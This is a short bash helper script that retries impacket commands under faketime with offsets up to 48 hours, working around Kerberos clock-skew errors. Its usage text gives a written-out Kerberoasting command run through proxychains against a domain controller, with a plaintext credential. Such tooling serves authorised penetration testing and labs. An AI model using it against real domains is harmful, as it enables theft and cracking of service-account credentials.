#!/usr/bin/env bash

if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <impacket command>"
    echo "Example:"
    echo "  $0 proxychains -q impacket-GetUserSPNs -dc-ip 172.16.1.15 -request-user svc_sql domain.local/websec:Password123!"
    exit 1
fi

ERROR_STRING="Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)"
MAX_HOURS=48

# Capture the full command as provided
CMD="$@"

for ((h=1; h<=MAX_HOURS; h++)); do
    echo "[*] Trying faketime +${h}h"

    OUTPUT=$(faketime -f "+${h}h" $CMD 2>&1)

    if ! echo "$OUTPUT" | grep -q "$ERROR_STRING"; then
        echo "[+] Success at faketime +${h}h"
        echo "================ COMMAND OUTPUT ================"
        echo "$OUTPUT"
        echo "================================================"
        exit 0
    fi
done

echo "[-] No valid time offset found up to +${MAX_HOURS}h"
exit 1
